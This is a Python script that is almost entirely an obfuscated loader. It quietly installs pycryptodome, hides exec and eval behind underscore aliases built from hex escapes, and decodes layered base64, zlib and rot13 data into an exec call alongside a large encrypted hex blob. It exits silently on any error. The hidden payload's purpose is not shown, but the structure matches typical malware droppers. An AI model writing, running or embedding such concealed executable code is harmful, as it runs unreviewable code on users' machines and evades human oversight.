import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

package_name = "pycryptodome"

warnings.filterwarnings("ignore", category=Warning)

if not check_installation(package_name):
    subprocess.run(["pip3", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    sys.setrecursionlimit(1000000000) 

    pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'ConnectionRefusedError | complex','exec':'wSTjRHtvDp0oHrlvbKs8jec9xptNFk60KFV1zDD7Ez22kAiGwXGN5N730bNB4rXAxYf7VxrD0VwqK2Cl','eval': bytes.fromhex('''0fcddaf8370cc7577522e8f398d1600045ff030479e5d331f6f2f8cadce4f67da9af13b16ab4efbe0a2377d583b56b15e317ae51039e0b2a70aed4356d934a9646b1ad24efb99ff8d3c14ed8d5d2b525156b7b1d81ce92d445570e8272df479198172dc43bb6d52caf916b6a19ddfa13145055b484fa89f5e91960bc7ff8d1fae8f4b78cc532d9df3d9ae9521b94861a07252441ea58a0651429ca3be84d8cf43f4550986f1b4879a11de6c0789ac06739ab8d594f9082a3ed02011b3a6d22f2ab2bc517467b4c7e42d42647457d50537d4187db54b44fe8a19fd6897b63561684eb8356eb0d2ff5b71e60271cf705c8eeaedaacc92bde8d0adee820b0b2ad742f870a5e1fdd570b4b49b89dd30f36eb8e01b831e4ee446dd02df98842779ceaad8f353512538575c5db149c7a96213d2b095145a697ce48c96fa536f1acd52b2fc1e97cd04e4122da4a05bd49873b027e534b447ff9706e65cd997f169fecc183dde63267842a5e8fb37650f1d361e46398217622dc8073185dfce5f1e1f3a28cf8264440301c531a5d2ab412fb3a76b68811a3d4e5af79137bea046f9bbf3c08d6d5617067d81f242ba7a6d1e7da8ed3b8c0a348cb5f8b363ace6b981b12695209d3ec32f29fb88c2a235a75757b6c515e82841117aa7c7fdc9c688575b3574b0e551b765b151dc6bc8ccdb1e7a7d6817b6a8297732aa4c3242813f414a11d14364113f2b83671201b8b43a8537691e741d8692429d1b9ea867c9ec636c5beaaa343b6332bfafbf79e1710ac282215de960089d7c1ee45df2ac2b003f03fcd34d5b4eb58aefbf9c3657ebc25a1c6bde54e0bae36287ae8b514622bbe9c372678be2394e09a911f33e64ed74c7eef0623d43729123051ee1814109adece3745f71c856d05f22c536d31e17698ecda51d7fc7817c694135797c9b3dbdc3e57fb4bc0b641148383719c5ea528c259a3b6f577dd1cf11574e112f7e210aa16fa36f22aa54c4e810af32d34ea262b0fea14dc3432d7422435672f7fc9f5433375906c0a6e07c47d590302c5cbbbbe19e7f155226412d46d09c7a3ea0cc46258010173f5563f49d3462a5f08e6dc9b4bcdba6df2afe72e963b472d0a6d30f562d46eab2d7b79533c28d1873398eb158efca6e6ad21c908201592d4a3de2105b8f5823155421605f2d1e6ed7bf4343baf51f67b2408ac508cf87b9f5a87d99abf8ac79371fb764ccb2527f22e26e496f63f798d3de2c4d8686fc32ecdd85290820840e23559a62d3f2831e045e8f002d79b507bbab9c1ea43d739a01457c1954584a7b95efa2d1721c850bc8ae67b1b02ba07d0b809f59f3d5ce4bf672401fce8bf8f97036fdf1aebc8260fb0767696cb2bd573bbdbc501e76f9f107a0d5a51603bfea74d579603e572a8f7c06ede1cbf381e2b3a09d3c4da1b8e2e61ceafaadd98e9e5106dd0ed25e29063fd296afb855d8d74de0922f814c5f532760c2d0a260b92e33291a305964d195350a726433e8f75826bdd8b6638fd2f83ea5f00e8bcac3e4fc6546ea7d16bc47a872f635a16d5f78d31faa1c5951831f41847392be45396adedb3f28e02517532d70b93e9950d2587d3eae85f817938344777f5e48b7877e38358b8474e4f65f74d1c98a1890ffa77ef00875fbc2dd0a9001134ece219e6f9e1316e4a9c25bfaa56c56faaf9e15285e1051b32d0c9ab8e724310dd11c7f288a0cd7c20d7206a7e58831ac7887258ded5f3969c0e8484fc9466781f8f3d179ca315e072aa59f82179289969d10d8cb772718b1fb8e26e2fe46f0396ed86c9e695557a87c7f002adb0dfccee082530d1dd9bfc3da058e337c1379b96cb00debbeefd1ca443dd6c2ab57f37b1aeb9549e7fe87292d3618727b2b321786a3866eae9ba6c7be984b2a6cccd11b1f57170b760b3868985e8df01262af791437f8f39a5bc51dc1a069bb2fd4063502cdb6b30788e7b1b69fc39d48c3b6672667260f4050a614d5d086c007cd787c156fb9813937916f1329f663a160f9d0a765d5ade433d5b3294299a151e772f80169fa71a29d361dac5f76bc02157ad21da6877209a10009fe2efaf4db666dcb44b3907551f0da86d889ca18fbbbb513a8c226ce0ad8dc80c82e7ffd20eebf7833e8d69846b55a326022afaf4f6b5468a7f505ce03cc8e8991966d43358ce254e5ad977b862259dc055a6312a8ed78f91f19a27be4948a39d1a2b60935bc5b815a90f5b3da8b76b2c34b5187906eb4f92bf920b2da4ab870a3fd314fc5e17bc65dc69d48d67cdf138c1654683f61f51f3dce03172893145688d609f579d5ba13d27156b9c05b980d76d03865649d66f4442bf494e82f91a935f5fb98fe026b75b91153c7f1a74c1a1de81197b5bcce042b8764b0980e2b7b038fdc171dededfda4bcce16a0c6b1d89b24245a59139ab585df2196b71e3dd76a8e7f2363e4284f680329253a5826f4f81ca31cff9c84e2184fb61ff86a6b4f34d2ceb7a69595c9d209f13b702b5f0dd65d61117a45f947f5bc902e0c634190c353a9f82830b019df957833c2e1d44afda660e68392e31e6a5c7b35f260f0703fc3952dc53dff096994fc70c6606ba9fb34b025267447e7c71618456119e14b514a1b9e1556beac91b56a48ae5ae02523abd5f40f85ddf70d8cc6977dca12a880a9a9238d3c617c13190546cfeed73b21ba805fc3652d7e14425044a002538f2a676e7bc3d96836921766527e986d8427d1b48fc9f834fb3e48f33f47157b218d0c4ea71fc61502cfe54e63e0b7bf8c8d6bb5f9bee0a75a1c2676ec0fabd25eaaed581511b4026840c218bc0bd37e0467e4722da4cd8b07d8411902b5449a40c7c7d449b97a461dd76a4e0c0b9811af8dfc14bbe467ada719a2da5'''.replace("\n","")) })

    _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

except Exception as e:
    exit()